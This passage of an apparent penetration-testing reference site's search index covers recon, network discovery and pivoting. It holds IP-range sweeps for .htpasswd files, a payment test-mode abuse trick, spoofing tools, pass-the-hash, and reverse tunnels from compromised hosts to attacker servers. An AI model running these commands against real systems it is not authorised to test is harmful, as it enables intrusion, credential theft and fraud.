threads More subdomain : ./gobuster -m dns -w subdomains.txt -u google.com -i gobuster -w wordlist -u URL -r -e ``` Using a script to detect all phpinfo.php files in a range of IPs (CIDR can be found with a whois) bash #!/bin/bash for ipa in 98.13{6..9}.{0..255}.{0..255}; do wget -t 1 -T 3 http://${ipa}/phpinfo.php; done & Using a script to detect all .htpasswd files in a range of IPs bash #!/bin/bash for ipa in 98.13{6..9}.{0..255}.{0..255}; do wget -t 1 -T 3 http://${ipa}/.htpasswd; done &","title":"List all the subdirectories and files"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#looking-for-web-vulnerabilities","text":"Look for private information in GitHub repos with GitRob bash git clone https://github.com/michenriksen/gitrob.git gitrob analyze johndoe --site=https://github.acme.com --endpoint=https://github.acme.com/api/v3 --access-tokens=token1,token2 Explore the website with a proxy (ZAP/Burp Suite) Start proxy, visit the main target site and perform a Forced Browse to discover files and directories Map technologies used with Wappalyzer and Burp Suite (or ZAP) proxy Explore and understand available functionality, noting areas that correspond to vulnerability types ```bash Burp Proxy configuration on port 8080 (in .bashrc): alias set_proxy_burp='gsettings set org.gnome.system.proxy.http host \"http://localhost\";gsettings set org.gnome.system.proxy.http port 8080;gsettings set org.gnome.system.proxy mode \"manual\"' alias set_proxy_normal='gsettings set org.gnome.system.proxy mode \"none\"' then launch Burp with : java -jar burpsuite_free_v*.jar & ``` WAHH Task Checklist copied from http://mdsec.net/wahh/tasks.html Subscribe to the site and pay for the additional functionality to test Launch a Nikto scan in case you missed something powershell nikto -h http://domain.example.com Payment functionality - @gwendallecoguic if the webapp you're testing uses an external payment gateway, check the doc to find the test credit numbers, purchase something and if the webapp didn't disable the test mode, it will be free From https://stripe.com/docs/testing#cards : \"Use any of the following test card numbers, a valid expiration date in the future, and any random CVC number, to create a successful payment. Each test card's billing country is set to U.S. \" e.g : Test card numbers and tokens NUMBER BRAND TOKEN 4242424242424242 Visa tok_visa 4000056655665556 Visa (debit) tok_visa_debit 5555555555554444 Mastercard tok_mastercard International test card numbers and tokens NUMBER TOKEN COUNTRY BRAND 4000000400000008 tok_at Austria (AT) Visa 4000000560000004 tok_be Belgium (BE) Visa 4000002080000001 tok_dk Denmark (DK) Visa 4000002460000001 tok_fi Finland (FI) Visa 4000002500000003 tok_fr France (FR) Visa","title":"Looking for Web vulnerabilities"},{"location":"Methodology%20and%20Resources/Methodology%20and%20enumeration/#references","text":"[BugBounty] Yahoo phpinfo.php disclosure - Patrik Fehrenbach Nmap CheatSheet - HackerTarget","title":"References"},{"location":"Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/","text":"Miscellaneous & Tricks All the tricks that couldn't be classified somewhere else. Send a message to another user # Windows PS C:\\> msg Swissky /SERVER:CRASHLAB \"Stop rebooting the XXXX service !\" PS C:\\> msg * /V /W /SERVER:CRASHLAB \"Hello all !\" # Linux $ wall \"Stop messing with the XXX service !\" $ wall -n \"System will go down for 2 hours maintenance at 13:00 PM\" # \"-n\" only for root $ who $ write root pts/2 # press Ctrl+D after typing the message. CrackMapExec Credential Database cmedb (default) > workspace create test cmedb (test) > workspace default cmedb (test) > proto smb cmedb (test)(smb) > creds cmedb (test)(smb) > export creds csv /tmp/creds","title":"Miscellaneous & Tricks"},{"location":"Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/#miscellaneous-tricks","text":"All the tricks that couldn't be classified somewhere else.","title":"Miscellaneous &amp; Tricks"},{"location":"Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/#send-a-message-to-another-user","text":"# Windows PS C:\\> msg Swissky /SERVER:CRASHLAB \"Stop rebooting the XXXX service !\" PS C:\\> msg * /V /W /SERVER:CRASHLAB \"Hello all !\" # Linux $ wall \"Stop messing with the XXX service !\" $ wall -n \"System will go down for 2 hours maintenance at 13:00 PM\" # \"-n\" only for root $ who $ write root pts/2 # press Ctrl+D after typing the message.","title":"Send a message to another user"},{"location":"Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/#crackmapexec-credential-database","text":"cmedb (default) > workspace create test cmedb (test) > workspace default cmedb (test) > proto smb cmedb (test)(smb) > creds cmedb (test)(smb) > export creds csv /tmp/creds","title":"CrackMapExec Credential Database"},{"location":"Methodology%20and%20Resources/Network%20Discovery/","text":"Network Discovery Summary Nmap Spyse Masscan Netdiscover Responder Bettercap Reconnoitre References Nmap Ping sweep (No port scan, No DNS resolution) nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v \"host down\" -sn : Disable port scanning. Host discovery only. -n : Never do DNS resolution Basic NMAP sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4 sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv \u2022 the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports \u2022 the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000) \u2022 192.168.0.1 is the IP address to scan \u2022 -oA OUTPUTFILE tells Nmap to output the findings in its three major formats at once using the filename \"OUTPUTFILE\" \u2022 -iL INPUTFILE tells Nmap to use the provided file as inputs CTF NMAP This configuration is enough to do a basic check for a CTF VM nmap -sV -sC -oA ~/nmap-initial 192.168.1.1 -sV : Probe open ports to determine service/version info -sC : to enable the script -oA : to save the results After this quick command you can add \"-p-\" to run a full scan while you work with the previous result Aggressive NMAP nmap -A -T4 scanme.nmap.org \u2022 -A: Enable OS detection, version detection, script scanning, and traceroute \u2022 -T4: Defines the timing for the task (options are 0-5 and higher is faster) Using searchsploit to detect vulnerable services nmap -p- -sV -oX a.xml IP_ADDRESS; searchsploit --nmap a.xml Generating nice scan report nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o \"`date +%m%d%y`_report.html\" NMAP Scripts nmap -sC : equivalent to --script=default nmap --script 'http-enum' -v web.xxxx.com -p80 -oN http-enum.nmap PORT STATE SERVICE 80/tcp open http | http-enum: | /phpmyadmin/: phpMyAdmin | /.git/HEAD: Git folder | /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)' |_ /image/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)' nmap --script smb-enum-users.nse -p 445 [target host] Host script results: | smb-enum-users: | METASPLOITABLE\\backup (RID: 1068) | Full name: backup | Flags: Account disabled, Normal user account | METASPLOITABLE\\bin (RID: 1004) | Full name: bin | Flags: Account disabled, Normal user account | METASPLOITABLE\\msfadmin (RID: 3000) | Full name: msfadmin,,, | Flags: Normal user account List Nmap scripts : ls /usr/share/nmap/scripts/ Spyse Spyse API - for detailed info is better to check Spyse Spyse Wrapper Searching for subdomains spyse -target xbox.com --subdomains Reverse IP Lookup spyse -target 52.14.144.171 --domains-on-ip Searching for SSL certificates spyse -target hotmail.com --ssl-certificates spyse -target \"org: Microsoft\" --ssl-certificates Getting all DNS records spyse -target xbox.com --dns-all Masscan masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000 # find machines on the network sudo masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp cat masscan_machines.tmp | grep open | cut -d \" \" -f4 | sort -u > masscan_machines.lst # find open ports for one machine sudo masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst # TCP grab banners and services information TCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d \" \" -f3 | tr '\\n' ',' | head -c -1) [ \"$TCP_PORTS\" ] && sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP # UDP grab banners and services information UDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d \" \" -f3 | tr '\\n' ',' | head -c -1) [ \"$UDP_PORTS\" ] && sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP Reconnoitre Dependencies: nbtscan nmap python2.7 ./reconnoitre.py -t 192.168.1.2-252 -o ./results/ --pingsweep --hostnames --services --quick If you have a segfault with nbtscan, read the following quote. Permission is denied on the broadcast address (.0) and it segfaults on the gateway (.1) - all other addresses seem fine here.So to mitigate the problem: nbtscan 192.168.0.2-255 Netdiscover netdiscover -i eth0 -r 192.168.1.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 20 Captured ARP Req/Rep packets, from 4 hosts. Total size: 876 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.1.AA 68:AA:AA:AA:AA:AA 15 630 Sagemcom 192.168.1.XX 52:XX:XX:XX:XX:XX 1 60 Unknown vendor 192.168.1.YY 24:YY:YY:YY:YY:YY 1 60 QNAP Systems, Inc. 192.168.1.ZZ b8:ZZ:ZZ:ZZ:ZZ:ZZ 3 126 HUAWEI TECHNOLOGIES CO.,LTD Responder responder -I eth0 -A # see NBT-NS, BROWSER, LLMNR requests without responding. responder.py -I eth0 -wrf Alternatively you can use the Windows version Bettercap bettercap -X --proxy --proxy-https -T <target IP> # better cap in spoofing, discovery, sniffer # intercepting http and https requests, # targetting specific IP only References TODO","title":"Network Discovery"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#network-discovery","text":"","title":"Network Discovery"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#summary","text":"Nmap Spyse Masscan Netdiscover Responder Bettercap Reconnoitre References","title":"Summary"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#nmap","text":"Ping sweep (No port scan, No DNS resolution) nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v \"host down\" -sn : Disable port scanning. Host discovery only. -n : Never do DNS resolution Basic NMAP sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4 sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv \u2022 the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports \u2022 the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000) \u2022 192.168.0.1 is the IP address to scan \u2022 -oA OUTPUTFILE tells Nmap to output the findings in its three major formats at once using the filename \"OUTPUTFILE\" \u2022 -iL INPUTFILE tells Nmap to use the provided file as inputs CTF NMAP This configuration is enough to do a basic check for a CTF VM nmap -sV -sC -oA ~/nmap-initial 192.168.1.1 -sV : Probe open ports to determine service/version info -sC : to enable the script -oA : to save the results After this quick command you can add \"-p-\" to run a full scan while you work with the previous result Aggressive NMAP nmap -A -T4 scanme.nmap.org \u2022 -A: Enable OS detection, version detection, script scanning, and traceroute \u2022 -T4: Defines the timing for the task (options are 0-5 and higher is faster) Using searchsploit to detect vulnerable services nmap -p- -sV -oX a.xml IP_ADDRESS; searchsploit --nmap a.xml Generating nice scan report nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o \"`date +%m%d%y`_report.html\" NMAP Scripts nmap -sC : equivalent to --script=default nmap --script 'http-enum' -v web.xxxx.com -p80 -oN http-enum.nmap PORT STATE SERVICE 80/tcp open http | http-enum: | /phpmyadmin/: phpMyAdmin | /.git/HEAD: Git folder | /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)' |_ /image/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)' nmap --script smb-enum-users.nse -p 445 [target host] Host script results: | smb-enum-users: | METASPLOITABLE\\backup (RID: 1068) | Full name: backup | Flags: Account disabled, Normal user account | METASPLOITABLE\\bin (RID: 1004) | Full name: bin | Flags: Account disabled, Normal user account | METASPLOITABLE\\msfadmin (RID: 3000) | Full name: msfadmin,,, | Flags: Normal user account List Nmap scripts : ls /usr/share/nmap/scripts/","title":"Nmap"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#spyse","text":"Spyse API - for detailed info is better to check Spyse Spyse Wrapper","title":"Spyse"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#searching-for-subdomains","text":"spyse -target xbox.com --subdomains","title":"Searching for subdomains"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#reverse-ip-lookup","text":"spyse -target 52.14.144.171 --domains-on-ip","title":"Reverse IP Lookup"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#searching-for-ssl-certificates","text":"spyse -target hotmail.com --ssl-certificates spyse -target \"org: Microsoft\" --ssl-certificates","title":"Searching for SSL certificates"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#getting-all-dns-records","text":"spyse -target xbox.com --dns-all","title":"Getting all DNS records"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#masscan","text":"masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000 # find machines on the network sudo masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp cat masscan_machines.tmp | grep open | cut -d \" \" -f4 | sort -u > masscan_machines.lst # find open ports for one machine sudo masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst # TCP grab banners and services information TCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d \" \" -f3 | tr '\\n' ',' | head -c -1) [ \"$TCP_PORTS\" ] && sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP # UDP grab banners and services information UDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d \" \" -f3 | tr '\\n' ',' | head -c -1) [ \"$UDP_PORTS\" ] && sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP","title":"Masscan"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#reconnoitre","text":"Dependencies: nbtscan nmap python2.7 ./reconnoitre.py -t 192.168.1.2-252 -o ./results/ --pingsweep --hostnames --services --quick If you have a segfault with nbtscan, read the following quote. Permission is denied on the broadcast address (.0) and it segfaults on the gateway (.1) - all other addresses seem fine here.So to mitigate the problem: nbtscan 192.168.0.2-255","title":"Reconnoitre"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#netdiscover","text":"netdiscover -i eth0 -r 192.168.1.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 20 Captured ARP Req/Rep packets, from 4 hosts. Total size: 876 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.1.AA 68:AA:AA:AA:AA:AA 15 630 Sagemcom 192.168.1.XX 52:XX:XX:XX:XX:XX 1 60 Unknown vendor 192.168.1.YY 24:YY:YY:YY:YY:YY 1 60 QNAP Systems, Inc. 192.168.1.ZZ b8:ZZ:ZZ:ZZ:ZZ:ZZ 3 126 HUAWEI TECHNOLOGIES CO.,LTD","title":"Netdiscover"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#responder","text":"responder -I eth0 -A # see NBT-NS, BROWSER, LLMNR requests without responding. responder.py -I eth0 -wrf Alternatively you can use the Windows version","title":"Responder"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#bettercap","text":"bettercap -X --proxy --proxy-https -T <target IP> # better cap in spoofing, discovery, sniffer # intercepting http and https requests, # targetting specific IP only","title":"Bettercap"},{"location":"Methodology%20and%20Resources/Network%20Discovery/#references","text":"TODO","title":"References"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/","text":"Network Pivoting Techniques Summary Windows netsh Port Forwarding SSH SOCKS Proxy Local Port Forwarding Remote Port Forwarding Proxychains Graftcp Web SOCKS - reGeorg Web SOCKS - pivotnacci Metasploit sshuttle chisel SharpChisel gost Rpivot RevSocks plink ngrok Capture a network trace with builtin tools Basic Pivoting Types Listen - Listen Listen - Connect Connect - Connect References Windows netsh Port Forwarding netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110 # Forward the port 4545 for the reverse shell, and the 80 for the http server for example netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545 netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80 # Correctly open the port on the machine netsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=in action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=out action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=in action=allow protocol=TCP localport=4545 netsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=out action=allow protocol=TCP localport=4545 listenaddress \u2013 is a local IP address waiting for a connection. listenport \u2013 local listening TCP port (the connection is waited on it). connectaddress \u2013 is a local or remote IP address (or DNS name) to which the incoming connection will be redirected. connectport \u2013 is a TCP port to which the connection from listenport is forwarded to. SSH SOCKS Proxy ssh -D8080 [user]@[host] ssh -N -f -D 9000 [user]@[host] -f : ssh in background -N : do not execute a remote command Cool Tip : Konami SSH Port forwarding [ENTER] + [~C] -D 1090 Local Port Forwarding ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host] Remote Port Forwarding ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host] ssh -R 3389:10.1.1.224:3389 root@10.11.0.32 Proxychains Config file : /etc/proxychains.conf [ProxyList] socks4 localhost 8080 Set the SOCKS4 proxy then proxychains nmap -sT 192.168.5.6 Graftcp A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy. :warning: Same as proxychains, with another mechanism to \"proxify\" which allow Go applications. # https://github.com/hmgle/graftcp # Create a SOCKS5, using Chisel or another tool and forward it through SSH (attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS (vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse (victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks # Run graftcp and specify the SOCKS5 (attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080 (attacker) $ graftcp ./nuclei -u http://172.16.1.24 Simple configuration file for graftcp # https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf ## Listen address (default \":2233\") listen = :2233 loglevel = 1 ## SOCKS5 address (default \"127.0.0.1:1080\") socks5 = 127.0.0.1:1080 # socks5_username = SOCKS5USERNAME # socks5_password = SOCKS5PASSWORD ## Set the mode for select a proxy (default \"auto\") select_proxy_mode = auto Web SOCKS - reGeorg reGeorg , the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. Drop one of the following files on the server: tunnel.ashx tunnel.aspx tunnel.js tunnel.jsp tunnel.nosocket.php tunnel.php tunnel.tomcat.5.jsp python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080 optional arguments: -h, --help show this help message and exit -l , --listen-on The default listening address -p , --listen-port The default listening port -r , --read-buff Local read buffer, max data to be sent per POST -u , --url The url containing the tunnel script -v , --verbose Verbose output[INFO|DEBUG] Web SOCKS - pivotnacci pivotnacci , a tool to make socks connections through HTTP agents. pip3 install pivotnacci pivotnacci https://domain.com/agent.php --password \"s3cr3t\" pivotnacci https://domain.com/agent.php --polling-interval 2000 Metasploit # Meterpreter list active port forwards portfwd list # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell portfwd add \u2013l 3389 \u2013p 3389 \u2013r target-host portfwd add -l 88 -p 88 -r 127.0.0.1 portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445 # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell portfwd delete \u2013l 3389 \u2013p 3389 \u2013r target-host # Meterpreter delete all port forwards portfwd flush or # Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0 run autoroute -s 192.168.15.0/24 use auxiliary/server/socks_proxy set SRVPORT 9090 set VERSION 4a # or use auxiliary/server/socks4a # (deprecated) # Meterpreter list all active routes run autoroute -p route #Meterpreter view available networks the compromised host can access # Meterpreter add route for 192.168.14.0/24 via Session number. route add 192.168.14.0 255.255.255.0 3 # Meterpreter delete route for 192.168.14.0/24 via Session number. route delete 192.168.14.0 255.255.255.0 3 # Meterpreter delete all routes route flush Empire (Empire) > socksproxyserver (Empire) > use module management/invoke_socksproxy (Empire) > set remoteHost 10.10.10.10 (Empire) > run sshuttle Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling. pacman -Sy sshuttle apt-get install sshuttle sshuttle -vvr user@10.10.10.10 10.1.1.0/24 sshuttle -vvr username@pivot_host 10.2.2.0/24 # using a private key $ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e \"ssh -i ~/.ssh/id_rsa\" # -x == exclude some network to not transmit over the tunnel # -x x.x.x.x.x/24 chisel go get -v github.com/jpillora/chisel # forward port 389 and 88 to hacker computer user@hacker$ /opt/chisel/chisel server -p 8008 --reverse user@victim$ .\\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 # SOCKS user@victim$ .\\chisel.exe client YOUR_IP:8008 R:socks SharpChisel A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel user@hacker$ ./chisel server -p 8080 --key \"private\" --auth \"user:pass\" --reverse --proxy \"https://www.google.com\" ================================================================ server : run the Server Component of chisel -p 8080 : run server on port 8080 --key \"private\": use \"private\" string to seed the generation of a ECDSA public and private key pair --auth \"user:pass\" : Creds required to connect to the server --reverse: Allow clients to specify reverse port forwarding remotes in addition to normal remotes. --proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight. user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks Ligolo Ligolo : Reverse Tunneling made easy for pentesters, by pentesters Build Ligolo ``powershell # Get Ligolo and dependencies cd go env GOPATH`/src git clone https://github.com/sysdream/ligolo cd ligolo make dep # Generate self-signed TLS certificates (will be placed in the certs folder) make certs TLS_HOST=example.com make build-all 2. Use Ligolo powershell # On your attack server. ./bin/localrelay_linux_amd64 # On the compromise host. ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555 ``` Gost Wiki English : https://docs.ginuerzh.xyz/gost/en/ git clone https://github.com/ginuerzh/gost cd gost/cmd/gost go build # Socks5 Proxy Server side: gost -L=socks5://:1080 Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true # Local Port Forward gost -L=tcp://:2222/192.168.1.1:22 [-F=..] Rpivot Server (Attacker box) python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0 Client (Compromised box) python client.py --server-ip <ip> --server-port 9443 Through corporate proxy python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\ --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e Passing the hash python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\ --ntlm-proxy-port 8080 --domain CORP --username jdoe \\ --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE revsocks # Listen on the server and create a SOCKS 5 proxy on port 1080 user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234 # Connect client to the server user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent \"Mozilla 5.0/IE Windows 10\" # Build for Linux git clone https://github.com/kost/revsocks export GOPATH=~/go go get github.com/hashicorp/yamux go get github.com/armon/go-socks5 go get github.com/kost/go-ntlmssp go build go build -ldflags=\"-s -w\" && upx --brute revsocks # Build for Windows go get github.com/hashicorp/yamux go get github.com/armon/go-socks5 go get github.com/kost/go-ntlmssp GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" go build -ldflags -H=windowsgui upx revsocks plink # exposes the SMB port of the machine in the port 445 of the SSH Server plink -l root -pw toor -R 445:127.0.0.1:445 # exposes the RDP port of the machine in the port 3390 of the SSH Server plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389 plink -l root -pw mypassword 192.168.18.84 -R plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445 plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP] # redirects the Windows port 445 to Kali on port 22 plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185 ngrok # get the binary wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip unzip ngrok-stable-linux-amd64.zip # log into the service ./ngrok authtoken 3U[REDACTED_TOKEN]Hm # deploy a port forwarding for 4433 ./ngrok http 4433 ./ngrok tcp 4433 cloudflared # Get the binary wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz tar xvzf cloudflared-stable-linux-amd64.tgz # Expose accessible internal service to the internet ./cloudflared tunnel --url <protocol>://<host>:<port> Capture a network trace with builtin tools Windows (netsh) ```ps1 # start a capture use the netsh command. netsh trace start capture=yes report=disabled tracefile=c:\\trace.etl maxsize=16384 # stop the trace netsh trace stop # Event tracing can be also used across a reboots netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\\trace.etl maxsize=16384 # To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version. etl2pcapng.exe c:\\trace.etl c:\\trace.pcapng # Use filters netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\\trace.etl maxsize=16384 * Linux (tcpdump) ps1 sudo apt-get install tcpdump tcpdump -w 0001.pcap -i eth0 tcpdump -A -i eth0 # capture every TCP packet tcpdump -i eth0 tcp # capture everything on port 22 tcpdump -i eth0 port 22 ``` Basic Pivoting Types Type Use Case Listen - Listen Exposed asset, may not want to connect out. Listen - Connect Normal redirect. Connect - Connect Can\u2019t bind, so connect to bridge two hosts Listen - Listen Type Use Case ncat ncat -v -l -p 8080 -c \"ncat -v -l -p 9090\" socat socat -v tcp-listen:8080 tcp-listen:9090 remote host 1 ncat localhost 8080 < file remote host 2 ncat localhost 9090 > newfile Listen - Connect Type Use Case ncat ncat -l -v -p 8080 -c \"ncat localhost 9090\" socat socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090 remote host 1 ncat localhost -p 8080 < file remote host 2 ncat -l -p 9090 > newfile Connect - Connect Type Use Case ncat ncat localhost 8080 -c \"ncat localhost 9090\" socat socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090 remote host 1 ncat -l -p 8080 < file remote host 2 ncat -l -p 9090 > newfile References Port Forwarding in Windows - Windows OS Hub Using the SSH \"Konami Code\" (SSH Control Sequences) - Jeff McJunkin A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko Pivoting Meterpreter \ud83c\uddeb\ud83c\uddf7 Etat de l\u2019art du pivoting r\u00e9seau en 2019 - Oct 28,2019 - Alexandre ZANNI - \ud83c\uddfa\ud83c\uddf8 Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8 Active Directory - hideandsec Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert","title":"Network Pivoting Techniques"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#network-pivoting-techniques","text":"","title":"Network Pivoting Techniques"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#summary","text":"Windows netsh Port Forwarding SSH SOCKS Proxy Local Port Forwarding Remote Port Forwarding Proxychains Graftcp Web SOCKS - reGeorg Web SOCKS - pivotnacci Metasploit sshuttle chisel SharpChisel gost Rpivot RevSocks plink ngrok Capture a network trace with builtin tools Basic Pivoting Types Listen - Listen Listen - Connect Connect - Connect References","title":"Summary"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#windows-netsh-port-forwarding","text":"netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110 # Forward the port 4545 for the reverse shell, and the 80 for the http server for example netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545 netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80 # Correctly open the port on the machine netsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=in action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=out action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=in action=allow protocol=TCP localport=4545 netsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=out action=allow protocol=TCP localport=4545 listenaddress \u2013 is a local IP address waiting for a connection. listenport \u2013 local listening TCP port (the connection is waited on it). connectaddress \u2013 is a local or remote IP address (or DNS name) to which the incoming connection will be redirected. connectport \u2013 is a TCP port to which the connection from listenport is forwarded to.","title":"Windows netsh Port 